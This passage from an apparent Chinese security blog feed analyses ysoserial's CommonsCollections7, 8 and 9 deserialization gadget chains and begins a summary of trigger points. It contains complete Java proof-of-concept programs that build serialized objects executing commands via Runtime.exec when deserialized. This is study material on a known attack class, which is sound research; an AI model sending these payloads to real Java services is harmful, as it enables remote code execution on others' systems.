<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lazyMap2.remove(&quot;yy&quot;);</span><br></pre></td></tr></table></figure>

<p>这里是因为Hashtable在放入第二个LazyMap时，由于两个hash值相同，继续调用到LazyMap.get的时候。会将第一个LazyMap的key，value值放入第二个中。</p>
<p><img src="6.png" alt=""></p>
<p>到这里整个payload构造完毕，完整的demo如下所示:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        Map lazymap1 = LazyMap.decorate(innerMap1,chainedTransformer);</span><br><span class="line">        lazymap1.put(<span class="string">"yy"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Map lazymap2 = LazyMap.decorate(innerMap2,chainedTransformer);</span><br><span class="line">        lazymap2.put(<span class="string">"zZ"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        hashtable.put(lazymap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazymap2,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        lazymap2.remove(<span class="string">"yy"</span>);</span><br><span class="line"></span><br><span class="line">         ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">         out.writeObject(hashtable);</span><br><span class="line">         out.flush();</span><br><span class="line">         out.close();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">         ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">         in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如下:</p>
<p><img src="7.png" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="http://blog.0kami.cn/2019/10/31/study-java-deserialized-commonscollections3-others/" target="_blank" rel="noopener">Java反序列化利用链挖掘之CommonsCollections5,6,7,9,10</a></li>
<li><a href="https://www.cnblogs.com/tr1ple/p/12427015.html" target="_blank" rel="noopener">java反序列化-ysoserial-调试分析总结篇(7)</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections</tag>
      </tags>
  </entry>
  <entry>
    <title>ysoserial分析之CommonsCollections8</title>
    <url>/2020/04/28/ysoserial-analyze-8/</url>
    <content><![CDATA[<p>这篇文章分析的是CommonsCollections8。它是2019年<code>navalorenzo</code>推动到ysoserial上的。CommonsCollections8利用的是commonscollections:4.0版本。这条利用链与CommonsCollections2，4比较相似，不同的是适用了新的readObject触发点<font color=#008000><code>TreeBag</code></font>。</p>
<a id="more"></a>

<p>前面已经分析了:<br><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a><br><a href="https://ananaskr.github.io/2020/04/24/ysoserial-analyze-2/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections2</a><br><a href="https://ananaskr.github.io/2020/04/23/ysoserial-analyze-3/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections3</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-4/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections4</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-5/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections5</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-6/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections6</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-7/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections7</a> </p>
<p>CommonsCollections8使用新的readObject触发点<code>TreeBag</code>。与CommonsCollections2，4一样，都是利用了TemplatesImpl来执行任意命令，TransformingCoparator.compare()来触发transform函数。</p>
<p>它整个的利用链如下所示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TreeBag.readObject()</span><br><span class="line">  -&gt;AbstractMapBag.doReadObject()</span><br><span class="line">    -&gt;TreeMap.put()</span><br><span class="line">      -&gt;TreeMap.compare()</span><br><span class="line">        -&gt;TransformingComparator.compare()</span><br><span class="line">          -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>

<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>首先看一下<code>TreeBag</code>这个类的readObject函数。</p>
<p><img src="1.png" alt=""></p>
<p>前面的都是正常的反序列化，这里关注<code>super.doReadObject()</code>。然后跟进它。</p>
<p><img src="2.png" alt=""></p>
<p>根据前面可知，传入的map为TreeMap类型，在doReadObject()函数调用了<code>TreeMap.put()</code>，跟进它。</p>
<p><img src="3.png" alt=""></p>
<p>当comparator不为空时，调用了<code>comparator.compare()函数</code>，根据之前的分析，这里使得comparator为TransformingComparator就可以了，剩下的与CommonsCollections2相同，就不分析了。</p>
<p><img src="4.png" alt=""></p>
<h2 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h2><p>首先是从TransformingComparator至执行命令后半部分。这在之前已经分析过，直接放出代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">        command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">        <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">Field field = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">field.set(templates,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes,<span class="keyword">null</span>&#125;);</span><br><span class="line"></span><br><span class="line">Field field0 = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">field0.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">field0.set(templates,<span class="string">"ananaskr12345"</span>);</span><br><span class="line"></span><br><span class="line">Field field1 = templates.getClass().getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">field1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">field.set(templates, TransformerFactory<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>())</span>;</span><br><span class="line"></span><br><span class="line">InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"toString"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>],<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">TransformingComparator transformingComparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br></pre></td></tr></table></figure>

<p>然后就是上述分析的TreeMap的comparator属性为构造好的TransformingComparator对象。例如下列这句代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TreeMap treemap = <span class="keyword">new</span> TreeMap(transformingcomparator);</span><br></pre></td></tr></table></figure>

<p>事实上，在TreeBag的readObject中，会进行TreeMap的实例化，只需要</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TreeBag treeBag = <span class="keyword">new</span> TreeBag(transformingComparator);</span><br><span class="line">treeBag.add(templates);</span><br></pre></td></tr></table></figure>

<p>然后再将transformer的iMethodName改为newTransformer即可。</p>
<p>完整的demo如下所示</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.bag.TreeBag;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">8207363842866235160L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Object templates = Class.forName(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>).newInstance();</span><br><span class="line">        String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        Field field = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(templates,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes,classFiles.classAsBytes(Foo<span class="class">.<span class="keyword">class</span>)&#125;)</span>;</span><br><span class="line"></span><br><span class="line">        Field field0 = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        field0.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field0.set(templates,<span class="string">"ananaskr12345"</span>);</span><br><span class="line"></span><br><span class="line">        Field field1 = templates.getClass().getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">        field1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field1.set(templates, TransformerFactoryImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>())</span>;</span><br><span class="line"></span><br><span class="line">        InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"toString"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>],<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">        TransformingComparator transformingComparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br><span class="line">        </span><br><span class="line">        TreeBag treeBag = <span class="keyword">new</span> TreeBag(transformingComparator);</span><br><span class="line">        treeBag.add(templates);</span><br><span class="line"></span><br><span class="line">        Field field2 = transformer.getClass().getDeclaredField(<span class="string">"iMethodName"</span>);</span><br><span class="line">        field2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field2.set(transformer,<span class="string">"newTransformer"</span>);</span><br><span class="line">        </span><br><span class="line">         ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">         out.writeObject(treeBag);</span><br><span class="line">         out.flush();</span><br><span class="line">         out.close();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">         ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">         in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果如图所示:</p>
<p><img src="5.png" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://www.anquanke.com/post/id/190472#h3-4" target="_blank" rel="noopener">Java反序列化利用链分析之CommonsCollections2,4,8</a></li>
<li><a href="https://github.com/frohoff/ysoserial/pull/116/files" target="_blank" rel="noopener">CommonsCollections8</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections</tag>
      </tags>
  </entry>
  <entry>
    <title>ysoserial分析之CommonsCollections9</title>
    <url>/2020/04/28/ysoserial-analyze-9/</url>
    <content><![CDATA[<p>这篇文章要分析的是CommonsCollections9，根据<a href="https://github.com/wh1t3p1g" target="_blank" rel="noopener">wh1t3p1g</a>师傅的收集，找到了<a href="https://github.com/meizjm3i" target="_blank" rel="noopener">梅子酒</a>师傅提交的CommonsCollections9。它利用了3.2.1版本中的<font color=#00800><code>DefaultedMap</code></font></p>
<a id="more"></a>

<p>前面已经分析了:<br><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a><br><a href="https://ananaskr.github.io/2020/04/24/ysoserial-analyze-2/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections2</a><br><a href="https://ananaskr.github.io/2020/04/23/ysoserial-analyze-3/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections3</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-4/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections4</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-5/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections5</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-6/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections6</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-7/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections7</a><br><a href="https://ananaskr.github.io/2020/04/28/ysoserial-analyze-8/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections8</a> </p>
<p>梅子酒师傅提交的CommonsCollections9利用的是commonscollections:3.2版本新增加的<code>DefaultedMap</code>类来替代LazyMap。因为这两个类中的get函数具有类似的作用。作者表明只能在JDK8u76成功，实际上，在jdk1.8.0_111也能成功？</p>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
<li>commonscollections:3.2.1</li>
<li>未配置security-manager</li>
</ul>
<p>先来看看整个的利用链</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">  -&gt;TiedMapEntry.toString()</span><br><span class="line">    -&gt;DefaultedMap.get()</span><br><span class="line">      -&gt;ChainedTransformer.transform()</span><br><span class="line">        -&gt;ConstantTransformer.transform()</span><br><span class="line">        -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>

<h2 id="利用链分析及payload构造"><a href="#利用链分析及payload构造" class="headerlink" title="利用链分析及payload构造"></a>利用链分析及payload构造</h2><p>从payload的整个利用链可以看出，整个链的构造和CommonsCollections5很相似，都是利用了BadAttributeValueExpException作为最外层。不同的只有中间的<code>DefaultedMap</code>类，那么就从分析这个类开始。定位到这个类的get函数</p>
<p><img src="1.png" alt=""></p>
<p>在函数里会调用<code>((Transformer)this.value).transform(key)</code>，当this.value为构造的ChainedTransformer对象时，就可以RCE了。而这个value在DefaultedMap实例化时传入的参数。如下代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map defaultedMap = DefaultedMap.decorate(map,transformer);</span><br></pre></td></tr></table></figure>

<p>然后其余的与CommonsCollections5一致，完整的demo如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.DefaultedMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer transformer  = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map defaultedMap = DefaultedMap.decorate(map,transformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(defaultedMap,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field field = val.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(val,tiedMapEntry);</span><br><span class="line">        </span><br><span class="line">         ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">         out.writeObject(val);</span><br><span class="line">         out.flush();</span><br><span class="line">         out.close();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">         ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">         in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行的结果如下所示:</p>
<p><img src="2.png" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="http://blog.0kami.cn/2019/10/31/study-java-deserialized-commonscollections3-others/" target="_blank" rel="noopener">Java反序列化利用链挖掘之CommonsCollections5,6,7,9,10</a></li>
<li><a href="https://github.com/frohoff/ysoserial/pull/125/commits/4edf02ba7765488cac124c92e04c6aae40da3e5d" target="_blank" rel="noopener">CommonsCollections9payload</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections</tag>
      </tags>
  </entry>
  <entry>
    <title>ysoserial之CommonsCollections系列总结</title>
    <url>/2020/04/29/ysoserial-cc-sumary/</url>
    <content><![CDATA[<p>花了一周的时间对现有的CommonsCollections利用链分析了一遍，这篇文章是总结一下各利用链的特点、适用场景以及我自己对于Java反序列化链的一点思考。</p>
<a id="more"></a>

<h1 id="各利用链利用点"><a href="#各利用链利用点" class="headerlink" title="各利用链利用点"></a>各利用链利用点</h1><p>从前面的分析中，对于每个利用链，我们可以从外层触发点、中间承接点、命令执行点来分析。<br><font color=#00F5FF></font></p>
<p><strong>外层触发点:</strong></p>
<ul>
<li><strong><font color=#008000>AnnotationInvocationHandler</font></strong><ul>
<li>CommonsCollections1</li>
<li>CommonsCollections3</li>
</ul>
</li>
<li><strong><font color=#008000>BadAttributeValueExpException</font></strong><ul>
<li>CommonsCollections5</li>
<li>CommonsCollections9</li>
</ul>
</li>
<li><strong><font color=#008000>HashSet</font></strong><ul>
<li>HashMap.hash <ul>
<li>CommonsCollections6</li>
</ul>
</li>
</ul>
</li>
<li><strong><font color=#008000>Hashtable</font></strong><ul>
<li>CommonsCollections7</li>
<li>CommonsCollections10</li>
</ul>
</li>
<li><strong><font color=#008000>PriorityQueue</font></strong><ul>
<li>CommonsCollections2</li>
<li>CommonsCollections4</li>
</ul>
</li>
<li><strong><font color=#008000>TreeBag</font></strong><ul>
<li>CommonsCollections8</li>
</ul>
</li>
</ul>
<p><strong>中间承接点</strong></p>
<ul>
<li><strong><font color=#00C5CD>Proxy.invoke</font></strong><ul>
<li>CommonsCollections1</li>
</ul>
</li>
<li><strong><font color=#00C5CD>AbstractMap.equals</font></strong><ul>
<li>CommonsCollections7</li>
</ul>
</li>
<li><strong><font color=#00C5CD>TreeMap</font></strong><ul>
<li>CommonsCollections8    </li>
</ul>
</li>
<li><strong><font color=#00C5CD>TransformingCompare</font></strong><ul>
<li>CommonsCollections2</li>
<li>CommonsCollections4</li>
</ul>
</li>
<li><strong><font color=#00C5CD>TiedMapEntry.getValue</font></strong><ul>
<li>hashCode <ul>
<li>CommonsCollections6</li>
<li>CommonsCollections10</li>
</ul>
</li>
<li>toString <ul>
<li>CommonsCollections5</li>
<li>CommonsCollections9</li>
</ul>
</li>
</ul>
</li>
<li><strong><font color=#00C5CD>LazyMap.get</font></strong><ul>
<li>CommonsCollections1</li>
<li>CommonsCollections3</li>
<li>CommonsCollections6</li>
<li>CommonsCollections5</li>
<li>CommonsCollections10</li>
</ul>
</li>
<li><strong><font color=#00C5CD>DefaultedMap.get</font></strong><ul>
<li>CommonsCollections9</li>
</ul>
</li>
</ul>
<blockquote>
<p>这里可以看到LazyMap.get和DefaultedMap.get是可作为中间承接点的第二层，即找到一个调用它的类作为中间承接点。</p>
</blockquote>
<p><strong>命令执行点</strong></p>
<ul>
<li><strong><font color=#CD5555>InvokerTransformer</font></strong>提供了通过反射创建实例对象<ul>
<li>constant+invoker+invoker<ul>
<li>CommonsCollections1</li>
<li>CommonsCollections3</li>
<li>CommonsCollections5</li>
<li>CommonsCollections6</li>
<li>CommonsCollections7</li>
<li>CommonsCollections9</li>
<li>CommonsCollections10</li>
</ul>
</li>
<li>Invoker反射调用<code>newTransformer</code>方法<ul>
<li>CommonsCollections8</li>
<li>CommonsCollections2</li>
</ul>
</li>
</ul>
</li>
<li><strong><font color=#CD5555>InstantiateTransformer</font></strong>提供了实例化当前传入的类的方法<ul>
<li>TrAXFilter类的构造方法中含有<code>templates.newTransformer()</code><ul>
<li>CommonsCollections4</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="根据commons-collections版本"><a href="#根据commons-collections版本" class="headerlink" title="根据commons-collections版本"></a>根据commons-collections版本</h1><h2 id="commonscollections3-1"><a href="#commonscollections3-1" class="headerlink" title="commonscollections3.1"></a>commonscollections3.1</h2><ul>
<li>CommonsCollections1</li>
<li>CommonsCollections3</li>
<li>CommonsCollections5</li>
<li>CommonsCollections6</li>
